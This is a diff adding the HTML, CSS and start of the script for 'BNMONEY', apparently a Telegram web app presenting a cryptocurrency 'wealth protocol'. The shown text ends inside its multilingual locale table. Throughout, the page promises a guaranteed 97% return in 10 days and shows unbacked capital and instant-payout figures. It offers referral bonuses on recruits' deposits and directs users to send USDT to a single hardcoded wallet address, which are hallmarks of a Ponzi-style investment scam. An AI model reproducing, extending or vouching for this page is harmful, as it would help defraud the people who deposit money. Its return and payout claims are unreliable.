@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BNMONEY — Aggressive Wealth Protocol</title>
+    <!-- Telegram WebApp SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono:wght@600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #050403;
+            --card-bg: rgba(18, 14, 9, 0.85);
+            --card-border: rgba(255, 215, 0, 0.35);
+            --gold-light: #fff3a1;
+            --gold-main: #ffd700;
+            --gold-dark: #b8860b;
+            --gold-gradient: linear-gradient(135deg, #ffffff 0%, #ffd700 45%, #d4af37 75%, #aa771c 100%);
+            --gold-glow: 0 0 25px rgba(255, 215, 0, 0.4);
+            --green-accent: #00ff66;
+            --green-gradient: linear-gradient(135deg, #66ff99 0%, #00cc44 100%);
+            --green-glow: 0 0 25px rgba(0, 255, 102, 0.4);
+            --text-main: #fefce8;
+            --text-muted: #8c785c;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body {
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at 50% -10%, rgba(255, 215, 0, 0.22) 0%, transparent 60%),
+                              radial-gradient(circle at 100% 60%, rgba(184, 134, 11, 0.15) 0%, transparent 50%),
+                              radial-gradient(circle at 0% 100%, rgba(0, 255, 102, 0.08) 0%, transparent 50%);
+            background-attachment: fixed; color: var(--text-main); display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden;
+        }
+        .app-wrapper { width: 100%; max-width: 480px; padding: 20px 16px 100px 16px; position: relative; }
+        .brand-header { text-align: center; margin-bottom: 22px; position: relative; }
+        .brand-logo { font-family: 'Cinzel', serif; font-size: 38px; font-weight: 900; letter-spacing: 6px; background: var(--gold-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.6)); }
+        .brand-subtitle { font-size: 10px; text-transform: uppercase; letter-spacing: 4px; color: var(--gold-light); margin-top: 2px; font-weight: 800; opacity: 0.9; }
+        .brand-badge { display: inline-block; margin-top: 6px; background: rgba(255, 215, 0, 0.1); border: 1px solid rgba(255, 215, 0, 0.4); padding: 3px 10px; border-radius: 20px; font-size: 9px; font-weight: 800; color: var(--gold-main); letter-spacing: 1px; }
+        .nav-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; background: rgba(10, 8, 5, 0.95); border: 1px solid var(--card-border); padding: 5px; border-radius: 16px; margin-bottom: 20px; backdrop-filter: blur(20px); box-shadow: 0 10px 35px rgba(0, 0, 0, 0.8); }
+        .nav-item { background: transparent; border: none; color: var(--text-muted); padding: 12px 0; font-size: 12px; font-weight: 800; text-align: center; cursor: pointer; border-radius: 12px; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .nav-item.active { background: var(--gold-gradient); color: #000000; box-shadow: var(--gold-glow); }
+        .section-card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px; margin-bottom: 16px; backdrop-filter: blur(25px); box-shadow: 0 12px 40px rgba(0, 0, 0, 0.7); position: relative; overflow: hidden; }
+        .section-card::before { content: ''; position: absolute; top: 0; left: -100%; right: 0; height: 2px; background: linear-gradient(90deg, transparent, var(--gold-main), transparent); animation: shine 3.5s infinite linear; }
+        @keyframes shine { 0% { left: -100%; } 50%, 100% { left: 100%; } }
+        .card-label { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: var(--gold-light); margin-bottom: 10px; font-weight: 800; }
+        .number-display { font-size: 30px; font-weight: 800; font-family: 'JetBrains Mono', monospace; background: var(--gold-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; letter-spacing: -0.5px; filter: drop-shadow(0 2px 10px rgba(255, 215, 0, 0.3)); }
+        .growth-display { font-size: 36px; font-weight: 800; font-family: 'JetBrains Mono', monospace; background: var(--green-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 10px 0; filter: drop-shadow(0 2px 16px rgba(0, 255, 102, 0.4)); }
+        .btn-cyber { background: var(--gold-gradient); color: #000000; border: none; padding: 16px; font-size: 13px; font-weight: 900; border-radius: 14px; cursor: pointer; text-align: center; width: 100%; letter-spacing: 1.5px; text-transform: uppercase; transition: all 0.2s ease; box-shadow: var(--gold-glow); }
+        .btn-cyber:active { transform: scale(0.97); }
+        .btn-outline { background: rgba(255, 215, 0, 0.05); border: 1px solid rgba(255, 215, 0, 0.4); color: var(--gold-light); padding: 12px; font-size: 12px; font-weight: 800; border-radius: 12px; cursor: pointer; text-align: center; width: 100%; margin-top: 10px; transition: all 0.2s ease; letter-spacing: 1px; text-transform: uppercase; }
+        .btn-outline:active { background: var(--gold-main); color: #000; }
+        .calc-slider { width: 100%; height: 8px; border-radius: 5px; background: rgba(255, 215, 0, 0.2); outline: none; -webkit-appearance: none; margin: 16px 0; }
+        .calc-slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 22px; height: 22px; border-radius: 50%; background: var(--gold-main); cursor: pointer; box-shadow: var(--gold-glow); }
+        .calc-res-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 14px; }
+        .calc-res-box { background: rgba(10, 8, 5, 0.8); border: 1px solid rgba(255, 215, 0, 0.2); padding: 12px; border-radius: 12px; text-align: center; }
+        .calc-res-val { font-family: 'JetBrains Mono', monospace; font-size: 16px; font-weight: 800; color: var(--green-accent); }
+        .calc-res-lbl { font-size: 9px; color: var(--text-muted); text-transform: uppercase; margin-top: 4px; letter-spacing: 0.5px; }
+        .lang-select { width: 100%; background: rgba(10, 8, 5, 0.95); border: 1px solid rgba(255, 215, 0, 0.4); color: var(--gold-light); padding: 12px; border-radius: 12px; font-size: 12px; font-weight: 700; outline: none; cursor: pointer; margin-top: 6px; }
+        .lang-select option { background: #0d0a06; color: #fff; }
+        .info-box { background: rgba(8, 6, 4, 0.95); border: 1px solid rgba(255, 215, 0, 0.2); border-radius: 12px; padding: 14px; margin-bottom: 12px; }
+        .mono-address { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--gold-light); word-break: break-all; line-height: 1.4; }
+        .status-badge { display: inline-flex; align-items: center; gap: 8px; font-size: 10px; font-weight: 800; color: var(--green-accent); background: rgba(0, 255, 102, 0.08); border: 1px solid rgba(0, 255, 102, 0.3); padding: 6px 14px; border-radius: 20px; margin-bottom: 14px; letter-spacing: 1px; text-transform: uppercase; }
+        .dot { width: 8px; height: 8px; background-color: var(--green-accent); border-radius: 50%; box-shadow: var(--green-glow); animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1); } }
+        .progress-bar-bg { width: 100%; height: 10px; background: rgba(255, 255, 255, 0.05); border-radius: 10px; overflow: hidden; margin-top: 14px; border: 1px solid rgba(255, 215, 0, 0.2); }
+        .progress-bar-fill { height: 100%; background: var(--green-gradient); width: 0%; transition: width 0.3s ease; box-shadow: var(--green-glow); }
+        .achieve-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 10px; }
+        .achieve-card { background: rgba(10, 8, 5, 0.8); border: 1px solid rgba(255, 215, 0, 0.2); border-radius: 14px; padding: 12px; text-align: center; position: relative; transition: all 0.3s ease; }
+        .achieve-card.unlocked { border-color: var(--gold-main); box-shadow: 0 0 15px rgba(255, 215, 0, 0.25); background: rgba(30, 22, 10, 0.9); }
+        .achieve-icon { font-size: 24px; margin-bottom: 4px; filter: grayscale(1); opacity: 0.3; }
+        .achieve-card.unlocked .achieve-icon { filter: grayscale(0); opacity: 1; transform: scale(1.1); }
+        .achieve-title { font-size: 10px; font-weight: 800; color: var(--text-main); text-transform: uppercase; }
+        .achieve-card.unlocked .achieve-title { color: var(--gold-main); }
+        .badge-status { position: absolute; top: 6px; right: 6px; font-size: 9px; }
+        .faq-item { background: rgba(10, 8, 5, 0.8); border: 1px solid rgba(255, 215, 0, 0.2); border-radius: 12px; margin-bottom: 8px; overflow: hidden; }
+        .faq-question { padding: 14px; font-size: 12px; font-weight: 800; color: var(--gold-light); cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        .faq-answer { padding: 0 14px 14px 14px; font-size: 11px; color: var(--text-muted); line-height: 1.5; display: none; }
+        .faq-item.open .faq-answer { display: block; }
+        .tab-page { display: none; }
+        .tab-page.active { display: block; animation: fadeIn 0.3s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+<div class="app-wrapper">
+    <div class="brand-header">
+        <div class="brand-logo">BNMONEY</div>
+        <div class="brand-subtitle" data-i18n="sub_header">Algorithmic Wealth Protocol</div>
+        <div class="brand-badge">BSC MAINNET • USDT BEP-20</div>
+    </div>
+
+    <div class="nav-grid">
+        <button class="nav-item active" onclick="setTab('main', this)" data-i18n="nav_home">Главная</button>
+        <button class="nav-item" onclick="setTab('markets', this)" data-i18n="nav_markets">Рынки</button>
+        <button class="nav-item" onclick="setTab('cabinet', this)" data-i18n="nav_cabinet">Кабинет</button>
+    </div>
+
+    <!-- 1. ГЛАВНАЯ -->
+    <div id="tab-main" class="tab-page active">
+        <div class="section-card" style="text-align: center; padding: 28px 18px;">
+            <h2 style="font-family: 'Cinzel', serif; font-size: 24px; margin-bottom: 10px; background: var(--gold-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent;" data-i18n="main_hero_title">
+                ФИНАНСОВОЕ ДОМИНИРОВАНИЕ
+            </h2>
+            <p style="color: var(--text-muted); font-size: 12px; line-height: 1.6; margin-bottom: 20px; font-weight: 600;" data-i18n="main_hero_desc">
+                Разгоняй свои активы с математической точностью. Алгоритм гарантирует +97% чистого роста за 10 дней без компромиссов.
+            </p>
+            <button class="btn-cyber" onclick="triggerNav('markets')" data-i18n="btn_subscribe">ЗАПУСТИТЬ РОСТ +97%</button>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="calc_title">🧮 Калькулятор Профита (+97%)</div>
+            <div style="font-size: 12px; color: var(--gold-light); font-weight: 700;">
+                <span data-i18n="calc_input_lbl">Сумма подписки:</span> 
+                <span id="calc-dep-val" style="color: var(--gold-main); font-family: 'JetBrains Mono'; font-size: 16px;">100</span> USDT
+            </div>
+            <input type="range" min="10" max="2000" step="10" value="100" class="calc-slider" id="calc-range" oninput="updateCalculator(this.value)">
+            <div class="calc-res-grid">
+                <div class="calc-res-box">
+                    <div class="calc-res-val" id="calc-res-total">$197.00</div>
+                    <div class="calc-res-lbl" data-i18n="calc_res_total">Итого через 10 дней</div>
+                </div>
+                <div class="calc-res-box">
+                    <div class="calc-res-val" id="calc-res-daily">+$9.70</div>
+                    <div class="calc-res-lbl" data-i18n="calc_res_daily">Профит в сутки</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="stats_title">Мощность Протокола</div>
+            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
+                <div style="background: rgba(10,8,5,0.8); border: 1px solid rgba(255,215,0,0.15); padding: 12px; border-radius: 12px; text-align: center;">
+                    <div style="font-family: 'JetBrains Mono'; font-size: 18px; font-weight: 800; color: var(--gold-light);">$2.45M+</div>
+                    <div style="font-size: 9px; color: var(--text-muted); text-transform: uppercase;" data-i18n="stat_tvl">Капитал Протокола</div>
+                </div>
+                <div style="background: rgba(10,8,5,0.8); border: 1px solid rgba(255,215,0,0.15); padding: 12px; border-radius: 12px; text-align: center;">
+                    <div style="font-family: 'JetBrains Mono'; font-size: 18px; font-weight: 800; color: var(--green-accent);">100% INSTANT</div>
+                    <div style="font-size: 9px; color: var(--text-muted); text-transform: uppercase;" data-i18n="stat_payout">Авто-Выплаты BSC</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="ref_info_title">👑 Партнерская Империя (10%)</div>
+            <p style="font-size: 11px; color: var(--text-muted); line-height: 1.5; margin-bottom: 10px;" data-i18n="ref_info_desc">
+                Получай 10% МГНОВЕННО на свой баланс с каждого депозита любого приглашенного реферала.
+            </p>
+        </div>
+    </div>
+
+    <!-- 2. РЫНКИ -->
+    <div id="tab-markets" class="tab-page">
+        <div style="font-family: 'Cinzel', serif; font-size: 15px; margin-bottom: 14px; color: var(--gold-light); letter-spacing: 2px; text-transform: uppercase;" data-i18n="plans_title">
+            Тарифные Подписки (+97% за 10 дней)
+        </div>
+        
+        <div class="section-card">
+            <div class="card-label" data-i18n="plan_std">Стандарт • +97%</div>
+            <div class="number-display">20.00$ ➔ 39.40$</div>
+            <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 14px;" data-i18n="plan_period">Плавный прирост: ~3.94$ в сутки.</p>
+            <button class="btn-cyber" onclick="subscribe(20.00, 39.40)" data-i18n="btn_sub_20">АКТИВИРОВАТЬ 20$</button>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="plan_plus">Плюс • +97%</div>
+            <div class="number-display">50.00$ ➔ 98.50$</div>
+            <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 14px;" data-i18n="plan_period">Плавный прирост: ~9.85$ в сутки.</p>
+            <button class="btn-cyber" onclick="subscribe(50.00, 98.50)" data-i18n="btn_sub_50">АКТИВИРОВАТЬ 50$</button>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="plan_prem">Премиум • +97%</div>
+            <div class="number-display">100.00$ ➔ 197.00$</div>
+            <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 14px;" data-i18n="plan_period">Плавный прирост: ~19.70$ в сутки.</p>
+            <button class="btn-cyber" onclick="subscribe(100.00, 197.00)" data-i18n="btn_sub_100">АКТИВИРОВАТЬ 100$</button>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="faq_title">Часто Задаваемые Вопросы</div>
+            <div class="faq-item" onclick="toggleFaq(this)">
+                <div class="faq-question"><span>Откуда берётся доход +97%?</span> <span>+</span></div>
+                <div class="faq-answer">Доход формируется за счет автоматического алгоритмического перераспределения комиссий пула ликвидности в сети Binance Smart Chain.</div>
+            </div>
+            <div class="faq-item" onclick="toggleFaq(this)">
+                <div class="faq-question"><span>Как быстро зачисляется USDT?</span> <span>+</span></div>
+                <div class="faq-answer">Сканер BSC обрабатывает транзакции мгновенно за 10-20 секунд сразу после 12 подтверждений сети.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. КАБИНЕТ -->
+    <div id="tab-cabinet" class="tab-page">
+        <div style="font-family: 'Cinzel', serif; font-size: 15px; margin-bottom: 14px; color: var(--gold-light); letter-spacing: 2px; text-transform: uppercase;" data-i18n="cab_title">
+            Командный Центр
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="lang_select_label">Язык интерфейса / Language</div>
+            <select id="lang-select" class="lang-select" onchange="changeLanguage(this.value)">
+                <option value="ru">Русский (Russian)</option>
+                <option value="en">English</option>
+                <option value="es">Español (Spanish)</option>
+                <option value="fr">Français (French)</option>
+                <option value="de">Deutsch (German)</option>
+                <option value="tm">Türkmen dili (Turkmen)</option>
+                <option value="tr">Türkçe (Turkish)</option>
+                <option value="ar">العربية (Arabic)</option>
+                <option value="zh">中文 (Chinese)</option>
+            </select>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="ref_link_label">Твоя Реферальная Ссылка (Бот)</div>
+            <div class="info-box">
+                <div class="mono-address" id="ref-link-display">Загрузка ссылки...</div>
+                <button class="btn-outline" id="copy-ref-btn" onclick="copyRefLink()" data-i18n="btn_copy_ref">СКОПИРОВАТЬ ССЫЛКУ БОТА</button>
+            </div>
+        </div>
+
+        <div class="section-card" style="padding: 16px;">
+            <div class="card-label" data-i18n="inviter_label">Твой Теневой Лидер</div>
+            <div style="font-size: 13px; font-weight: 800; color: var(--gold-main); font-family: 'JetBrains Mono';">
+                👑 <span id="referrer-display">...</span>
+            </div>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="balance_label">Личный Капитал</div>
+            <div class="number-display"><span id="user-balance">0.00</span> USDT</div>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="achieve_block_title">Твои Звания и Достижения</div>
+            <div class="achieve-grid">
+                <div class="achieve-card" id="ach-1">
+                    <div class="badge-status" id="ach-1-status">🔒</div>
+                    <div class="achieve-icon">⚡</div>
+                    <div class="achieve-title">Старт</div>
+                </div>
+                <div class="achieve-card" id="ach-2">
+                    <div class="badge-status" id="ach-2-status">🔒</div>
+                    <div class="achieve-icon">👑</div>
+                    <div class="achieve-title">Премиум</div>
+                </div>
+                <div class="achieve-card" id="ach-3">
+                    <div class="badge-status" id="ach-3-status">🔒</div>
+                    <div class="achieve-icon">🤝</div>
+                    <div class="achieve-title">Сеть</div>
+                </div>
+                <div class="achieve-card" id="ach-4">
+                    <div class="badge-status" id="ach-4-status">🔒</div>
+                    <div class="achieve-icon">💎</div>
+                    <div class="achieve-title">Инвестор</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section-card">
+            <div class="status-badge">
+                <div class="dot"></div>
+                <span data-i18n="scanner_status">BSC AUTO-SCANNER ONLINE</span>
+            </div>
+            <div class="card-label" data-i18n="deposit_label">Пополнение USDT (BEP-20) на Адрес:</div>
+            <div class="info-box">
+                <div class="mono-address" id="wallet-address">0x86d6C0105B491582FDE5eB0655A03dD19Aaa46C4</div>
+                <button class="btn-outline" id="copy-btn" onclick="copyWalletAddress()" data-i18n="btn_copy_wallet">СКОПИРОВАТЬ АДРЕС</button>
+            </div>
+        </div>
+
+        <div class="section-card">
+            <div class="card-label" data-i18n="active_sub_label">Активный Разгон Капитала</div>
+            <div id="subscription-status" style="font-size: 12px; color: var(--text-muted);" data-i18n="no_sub">
+                Нет активных инвестиций. Выберите тариф в разделе Рынки.
+            </div>
+            <div id="active-growth-box" style="display: none; margin-top: 15px;">
+                <div class="card-label" data-i18n="current_val_label">Текущая стоимость:</div>
+                <div class="growth-display"><span id="current-subscription-value">0.00</span> $</div>
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="progress-fill"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const MY_WALLET = "0x86d6C0105B491582FDE5eB0655A03dD19Aaa46C4";
+    const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955".toLowerCase();
+    let balance = 0.00;
+    let growthInterval = null;
+    let currentLang = 'ru';
+    let creditedTxs = new Set(JSON.parse(localStorage.getItem('creditedTxs') || '[]'));
+
+    const locales = {
+        ru: { sub_header: "Алгоритмический Протокол Роста", nav_home: "Главная", nav_markets: "Рынки", nav_cabinet: "Кабинет", main_hero_title: "ФИНАНСОВОЕ ДОМИНИРОВАНИЕ", main_hero_desc: "Разгоняй свои активы с математической точностью. Алгоритм гарантирует +97% чистого роста за 10 дней без компромиссов.", btn_subscribe: "ЗАПУСТИТЬ РОСТ +97%", calc_title: "🧮 Калькулятор Профита (+97%)", calc_input_lbl: "Сумма подписки:", calc_res_total: "Итого через 10 дней", calc_res_daily: "Профит в сутки", stats_title: "Мощность Протокола", stat_tvl: "Капитал Протокола", stat_payout: "Авто-Выплаты BSC", ref_info_title: "👑 Партнерская Империя (10%)", ref_info_desc: "Получай 10% МГНОВЕННО на свой баланс с каждого депозита любого приглашенного реферала.", plans_title: "Тарифные Подписки (+97% за 10 дней)", plan_std: "Стандарт • +97%", plan_plus: "Плюс • +97%", plan_prem: "Премиум • +97%", plan_period: "Срок активации: 10 дней плавного роста.", btn_sub_20: "АКТИВИРОВАТЬ 20$", btn_sub_50: "АКТИВИРОВАТЬ 50$", btn_sub_100: "АКТИВИРОВАТЬ 100$", cab_title: "Командный Центр", lang_select_label: "Язык интерфейса", ref_link_label: "Твоя Реферальная Ссылка (Бот)", btn_copy_ref: "СКОПИРОВАТЬ ССЫЛКУ БОТА", inviter_label: "Твой Теневой Лидер", balance_label: "Личный Капитал", scanner_status: "BSC AUTO-SCANNER ONLINE", deposit_label: "Пополнение USDT (BEP-20) на Адрес:", btn_copy_wallet: "СКОПИРОВАТЬ АДРЕС", active_sub_label: "Активный Разгон Капитала", no_sub: "Нет активных инвестиций.", current_val_label: "Текущая стоимость:", achieve_block_title: "Твои Звания и Достижения", faq_title: "Часто Задаваемые Вопросы", copied: "СКОПИРОВАНО! ✓", direct_launch: "Прямой Запуск (Без Лидера)", insufficient_funds: "Недостаточно средств на балансе!", sub_active_msg: "Подписка успешно запущена!" },
+        en: { sub_header: "Algorithmic Wealth Protocol", nav_home: "Home", nav_markets: "Markets", nav_cabinet: "Cabinet", main_hero_title: "FINANCIAL DOMINANCE", main_hero_desc: "Scale your assets with mathematical precision. The algorithm guarantees +97% net growth in 10 days.", btn_subscribe: "START GROWTH +97%", calc_title: "🧮 Yield Calculator (+97%)", calc_input_lbl: "Subscription Amount:", calc_res_total: "Total after 10 Days", calc_res_daily: "Daily Profit", stats_title: "Protocol Power", stat_tvl: "Protocol TVL", stat_payout: "BSC Auto-Payouts", ref_info_title: "👑 Referral Empire (10%)", ref_info_desc: "Get 10% INSTANTLY added to your balance from every deposit made by your referrals.", plans_title: "Subscription Plans (+97% in 10 Days)", plan_std: "Standard • +97%", plan_plus: "Plus • +97%", plan_prem: "Premium • +97%", plan_period: "Activation period: 10 days of algorithmic growth.", btn_sub_20: "ACTIVATE $20", btn_sub_50: "ACTIVATE $50", btn_sub_100: "ACTIVATE $100", cab_title: "Command Center", lang_select_label: "Interface Language", ref_link_label: "Your Bot Referral Link", btn_copy_ref: "COPY BOT LINK", inviter_label: "Your Shadow Leader", balance_label: "Personal Capital", scanner_status: "BSC AUTO-SCANNER ONLINE", deposit_label: "Deposit USDT (BEP-20) Address:", btn_copy_wallet: "COPY ADDRESS", active_sub_label: "Active Capital Growth", no_sub: "No active investments.", current_val_label: "Current Value:", achieve_block_title: "Your Achievements", faq_title: "Frequently Asked Questions", copied: "COPIED! ✓", direct_launch: "Direct Launch (No Leader)", insufficient_funds: "Insufficient funds!", sub_active_msg: "Subscription activated!" },
+        es: { sub_header: "Protocolo de Crecimiento Algorítmico", nav_home: "Inicio", nav_markets: "Mercados", nav_cabinet: "Gabinete", main_hero_title: "DOMINIO FINANCIERO", main_hero_desc: "Aumente sus activos con precisión matemática. +97% de crecimiento neto en 10 días.", btn_subscribe: "INICIAR CRECIMIENTO +97%", calc_title: "🧮 Calculadora de Rentabilidad", calc_input_lbl: "Monto de Suscripción:", calc_res_total: "Total en 10 días", calc_res_daily: "Ganancia Diaria", stats_title: "Potencia del Protocolo", stat_tvl: "TVL del Protocolo", stat_payout: "Pagos Auto BSC", ref_info_title: "👑 Imperio de Referidos (10%)", ref_info_desc: "Obtenga un 10% AL INSTANTE en su saldo por cada depósito de sus referidos.", plans_title: "Planes de Suscripción", plan_std: "Estándar • +97%", plan_plus: "Plus • +97%", plan_prem: "Premium • +97%", plan_period: "Período: 10 días de crecimiento.", btn_sub_20: "ACTIVAR $20", btn_sub_50: "ACTIVAR $50", btn_sub_100: "ACTIVAR $100", cab_title: "Centro de Comando", lang_select_label: "Idioma de Interfaz", ref_link_label: "Enlace de Referido del Bot", btn_copy_ref: "COPIAR ENLACE BOT", inviter_label: "Tu Líder", balance_label: "Capital Personal", scanner_status: "BSC AUTO-SCANNER ONLINE", deposit_label: "Dirección de Depósito USDT:", btn_copy_wallet: "COPIAR DIRECCIÓN", active_sub_label: "Crecimiento Activo", no_sub: "Sin inversiones activas.", current_val_label: "Valor Actual:", achieve_block_title: "Tus Logros", faq_title: "Preguntas Frecuentes", copied: "¡COPIADO! ✓", direct_launch: "Lanzamiento Directo", insufficient_funds: "¡Fondos insuficientes!", sub_active_msg: "¡Suscripción activada!" },
+        fr: { sub_header: "Protocole de Croissance Algorithmique", nav_home: "Accueil", nav_markets: "Marchés", nav_cabinet: "Cabinet", main_hero_title: "DOMINATION FINANCIÈRE", main_hero_desc: "Développez vos actifs avec une précision mathématique. +97% de croissance en 10 jours.", btn_subscribe: "LANCER CROISSANCE +97%", calc_title: "🧮 Calculateur de Profit", calc_input_lbl: "Montant de l'abonnement:", calc_res_total: "Total après 10 jours", calc_res_daily: "Profit quotidien", stats_title: "Puissance du Protocole", stat_tvl: "Capital du Protocole", stat_payout: "Paiements Auto BSC", ref_info_title: "👑 Empire de Parrainage (10%)", ref_info_desc: "Obtenez 10% INSTANTANÉMENT sur chaque dépôt effectué par vos filleuls.", plans_title: "Abonnements", plan_std: "Standard • +97%", plan_plus: "Plus • +97%", plan_prem: "Premium • +97%", plan_period: "Période: 10 jours de croissance.", btn_sub_20: "ACTIVER 20$", btn_sub_50: "ACTIVER 50$", btn_sub_100: "ACTIVER 100$", cab_title: "Centre de Commande", lang_select_label: "Langue", ref_link_label: "Lien de parrainage Bot", btn_copy_ref: "COPIER LIEN BOT", inviter_label: "Votre Parrain", balance_label: "Capital Personnel", scanner_status: "BSC AUTO-SCANNER EN LIGNE", deposit_label: "Adresse de Dépôt USDT:", btn_copy_wallet: "COPIER L'ADRESSE", active_sub_label: "Croissance Active", no_sub: "Aucun investissement actif.", current_val_label: "Valeur Actuelle:", achieve_block_title: "Vos Succès", faq_title: "Foire Aux Questions", copied: "COPIÉ! ✓", direct_launch: "Lancement Direct", insufficient_funds: "Fonds insuffisants!", sub_active_msg: "Abonnement activé!" },
+        de: { sub_header: "Algorithmisches Wachstumsprotokoll", nav_home: "Startseite", nav_markets: "Märkte", nav_cabinet: "Kabinett", main_hero_title: "FINANZIELLE DOMINANZ", main_hero_desc: "Skalieren Sie Ihre Vermögenswerte mit mathematischer Präzision. +97% Wachstum in 10 Tagen.", btn_subscribe: "WACHSTUM STARTEN +97%", calc_title: "🧮 Profit-Rechner", calc_input_lbl: "Abonnement-Betrag:", calc_res_total: "Gesamt nach 10 Tagen", calc_res_daily: "Täglicher Profit", stats_title: "Protokoll-Leistung", stat_tvl: "Protokoll-Kapital", stat_payout: "BSC Auto-Auszahlungen", ref_info_title: "👑 Empfehlungsimperium (10%)", ref_info_desc: "Erhalten Sie SOFORT 10% auf jede Einzahlung Ihrer geworbenen Partner.", plans_title: "Abonnements", plan_std: "Standard • +97%", plan_plus: "Plus • +97%", plan_prem: "Premium • +97%", plan_period: "Laufzeit: 10 Tage Wachstum.", btn_sub_20: "20$ AKTIVIEREN", btn_sub_50: "50$ AKTIVIEREN", btn_sub_100: "100$ AKTIVIEREN", cab_title: "Kommandozentrale", lang_select_label: "Sprache", ref_link_label: "Bot Empfehlungs-Link", btn_copy_ref: "BOT-LINK KOPIEREN", inviter_label: "Ihr Leader", balance_label: "Persönliches Kapital", scanner_status: "BSC AUTO-SCANNER ONLINE", deposit_label: "USDT Einzahlungsadresse:", btn_copy_wallet: "ADRESSE KOPIEREN", active_sub_label: "Aktives Kapitalwachstum", no_sub: "Keine aktiven Investitionen.", current_val_label: "Aktueller Wert:", achieve_block_title: "Ihre Erfolge", faq_title: "Häufige Fragen", copied: "KOPIERT! ✓", direct_launch: "Direktstart", insufficient_funds: "Unzureichendes Guthaben!", sub_active_msg: "Abonnement aktiviert!" },
+        tm: { sub_header: "Algoritmiki Ösüş Protokoly", nav_home: "Baş sahypa", nav_markets: "Bazarlar", nav_cabinet: "Kabinet", main_hero_title: "MALIÝE AGALYGY", main_hero_desc: "Aktivleriňizi takyk matematika bilen ulaldyň. 10 günde +97% netije kepillendirilýär.", btn_subscribe: "ÖSÜŞI BAŞLA +97%", calc_title: "🧮 Girdeji Kalkulýatory", calc_input_lbl: "Abunalyk mukdary:", calc_res_total: "10 günden soňky jemi", calc_res_daily: "Gündelik peýda", stats_title: "Protokol Kuwwaty", stat_tvl: "Protokol Kapitallygy", stat_payout: "BSC Awtomatiki Tölegler", ref_info_title: "👑 Çakylyk Imperiýasy (10%)", ref_info_desc: "Çagyran dostlaryňyzyň her bir depozitinden ДЕССИНЕ 10% balansyňyza alyň.", plans_title: "Nyrx Meýilnamalary", plan_std: "Standart • +97%", plan_plus: "Plus • +97%", plan_prem: "Premium • +97%", plan_period: "Möhleti: 10 gün gün saýyn ösüş.", btn_sub_20: "20$ AKTIWLEŞDIR", btn_sub_50: "50$ AKTIWLEŞDIR", btn_sub_100: "100$ AKTIWLEŞDIR", cab_title: "Dolandyryş Merkezi", lang_select_label: "Dili saýlaň", ref_link_label: "Siziň Bot Salgylanmaňyz", btn_copy_ref: "BOT SALGYLANMASYNY GÖÇÜR", inviter_label: "Siziň Çakylykçyňyz", balance_label: "Şahsy Kapital", scanner_status: "BSC AUTO-SCANNER ONLINE", deposit_label: "USDT Depozit Salgysy:", btn_copy_wallet: "SALGYNY GÖÇÜR", active_sub_label: "Aktiw Ösüş", no_sub: "Aktiw maýa goýum ýok.", current_val_label: "Häzirki bahasy:", achieve_block_title: "Siziň Derejeleriňiz", faq_title: "Ygy-ýygydan Berilýän Soraglar", copied: "GÖÇÜRILDI! ✓", direct_launch: "Göni Giriş", insufficient_funds: "Balansda serişde ýetensiz!", sub_active_msg: "Abunalyk aktiwleşdirildi!" },
